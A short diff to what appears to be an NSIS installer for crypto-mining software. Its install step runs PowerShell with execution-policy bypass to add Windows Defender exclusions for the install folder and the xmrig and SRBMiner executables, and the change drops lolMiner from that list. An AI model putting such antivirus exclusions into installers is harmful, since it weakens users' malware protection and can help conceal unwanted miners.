@@ -12,7 +12,7 @@
 
   AddExclusions:
     ; Already running elevated via installMode "both" — run PowerShell directly
-    nsExec::ExecToLog 'powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''$INSTDIR''; Add-MpPreference -ExclusionProcess ''$INSTDIR\xmrig.exe''; Add-MpPreference -ExclusionProcess ''$INSTDIR\lolMiner.exe''; Add-MpPreference -ExclusionProcess ''$INSTDIR\SRBMiner-MULTI.exe''"'
+    nsExec::ExecToLog 'powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''$INSTDIR''; Add-MpPreference -ExclusionProcess ''$INSTDIR\xmrig.exe''; Add-MpPreference -ExclusionProcess ''$INSTDIR\SRBMiner-MULTI.exe''"'
     Pop $0
     ${If} $0 != 0
       MessageBox MB_OK|MB_ICONINFORMATION \
